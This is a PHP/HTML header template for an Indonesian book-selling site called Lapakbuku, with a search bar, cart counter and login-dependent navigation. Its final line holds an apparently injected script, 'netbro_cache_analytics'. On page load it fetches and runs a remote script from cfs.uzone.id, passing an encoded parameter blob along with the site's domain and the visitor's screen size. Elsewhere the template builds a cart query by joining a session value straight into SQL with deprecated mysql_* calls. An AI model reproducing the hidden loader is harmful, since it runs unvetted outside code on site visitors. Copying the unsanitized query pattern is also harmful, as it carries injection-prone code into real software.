<style type="text/css">
    input[type=text] {
    width: 200px;
    box-sizing: border-box;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 16px;
    background-color: white;
    background-image: url('searchicon.png');
    background-position: 10px 10px; 
    background-repeat: no-repeat;
    padding: 10px;
    margin: 10px 0 10px 0;
    float: left;
    -webkit-transition: width 0.6s ease-in-out;
    transition: width 0.6s ease-in-out;
    color: #ccc;
}

input[type=text]:focus {
    width: 30%;
}
</style>
<div class="top-header" style=" z-index: 9999; width: 100%; ">
    <div class="header-atas">
    <div class="kiri">
        <ul>Situs Jual Beli Buku Mudah Aman & Terpercaya</ul>
    </div>
    <div class="kanan">
        <ul>
            <li><a href="view_all_vendor.php?aksi=view_tampil_Vendor">Vendor Acount</a></li>
            <li><a href="blog.php?aksi=view_tampil_our_blog">Blog</a></li>
            <li><a href="">Bantuan</a></li>
            <li><a href="all_trafic_transactions.php">Status Transaksi</a></li>
        </ul>
    </div>
</div>

<div class="header">
    <nav>
    <?php
            include "root.php";
            $db=new data();
            error_reporting(0);
            session_start();
            if($_SESSION['pembeli']){
                ?>
            <?php 
            $keranjang=mysql_query("select * from produk_temp where id_pembeli='".$_SESSION['id_pembeli']."'");
            $ker=mysql_num_rows($keranjang);
         ?>
         <ul>
            <li><a href="index.php" ><h2>Lapakbuku</h2></a></li>
           <form method="get" action="">
              <input type="text" id="search" name="term" placeholder="Aku mau cari buku...">
            </form>
                <script type="text/javascript">
                        $(document).ready(function(){
                            $("#search").autocomplete({
                                source: "<?php echo 'data_search.php';?>"
                            });
                        }); 
                </script>
            <a href="vendor.php?%7ehs72"><img src="asset/image/icon/camera.png" style=" margin: 10px 0 10px 0; margin-left: 6%; width: 30px ; height: 30px;">
            </a>
        
            <a href="handler.php?aksi=logout"><input type="submit" value="Logout" style=" font-size: 14px; float: right; margin-right: 6%; width: 100px; border-radius: 4px;"></a>
            <a href="vendor/home.php"><input type="submit" value="Dasboard" style=" font-size: 14px; float: right; margin-right: 5px; width: 100px; border-radius: 4px;"></a>
            <a href="creat-market.php"><input type="submit" value="Buat Toko" style=" font-size: 14px; float: right; margin-right: 5px; width: 100px; border-radius: 4px;"></a>
             <a href="checkout.php"><input type="submit" value="<?php echo $ker; ?>" style=" font-size: 14px; float: right; margin-right: 5px; width: 50px; border-radius: 4px;"></a>
            
            <div class="chip" style="float: right; margin-right: 2%; ">
              <img src="asset/image/icon/User-Profile.png" style="width: 30px; height: 30px;" ">
              <?php echo $_SESSION['pembeli'] ?>
              <span class="closebtn" onclick="this.parentElement.style.display='none'">&times;</span>
            </div>
        </ul>
        <?php
        }else{
            ?>
        <ul>
            <li><a href="index.php" ><h2>Lapakbuku</h2></a></li>
            <form method="get" action="search_book_detail.php">
              <input type="text" id="search" name="term" placeholder="Aku mau cari buku...">
            </form>
                <script type="text/javascript">
                        $(document).ready(function(){
                            $("#search").autocomplete({
                                source: "<?php echo 'data_search.php';?>"
                            });
                        }); 
                </script>
            <a href="vendor.php"><img src="asset/image/icon/camera.png" style=" margin: 10px 0 10px 0; margin-left: 6%; width: 30px ; height: 30px;">
            </a>
            <a href="login.php"><input type="submit" value="Masuk" style=" font-size: 14px; float: right; margin-right: 6%; width: 100px; border-radius: 4px;"></a>
            <a href="register.php"><input type="submit" value="Daftar" style=" font-size: 14px; float: right; margin-right: 5px; width: 100px; border-radius: 4px;"></a>
        </ul>
            <?php
        }
        ?>
    </nav>

</div>
</div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK0qZadE47JUeybbr7urQtNeGdeWHac1f5BVGsOJPaeV3o4h8teZWSLrJqLkjZ8pw9eFoQFhqFAvXyXjga%2buT9e0s%2fmYhdjmPjIvvbidBCt75th%2fbcTtsftvVgc8yxjuuwUvztuoMRNyHTWG4yHJp4GqpdKu4zZv%2b6Z%2bFkhx3SuXoXYHAl0oRNhMjNu9Hq0l3LeL2A9XVS93f4yWVR9vuli7jm3RD9Tox3rICqoD86TDrgAL8BmvLS3ZfGa%2b7tcuk1VCwR%2fDg2h1fz8elkeZq7TqxmNX7xxc89BG4zXoYyvHW3LMWhsqTY6rov0ywT8O3YyrZdub2BwHRSqtKQkUqAtyoOIaFPXx41h2N5pVtLk5p3IbQHYYV6P4NtlimlDh6IPmwNfNJM9%2bT2ICWJIFHSFojhgquThRdqrGdht5s%2bVglB7XC3ntRsW1AfM7J%2fRV62vwzJ1JuX3cCzl6FgeItTYpxod8XgXWjs9%2f3kOGt7li4%2fH1odpUAxJU2O9dRq2fZEJtJguISRCREuKCbjzsWFWilR4CkXTP93cBcDYcAShGs8AFoxsKK5CsZ7rCj08yMWukAP0H6cGefJtlf5Kr64mQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

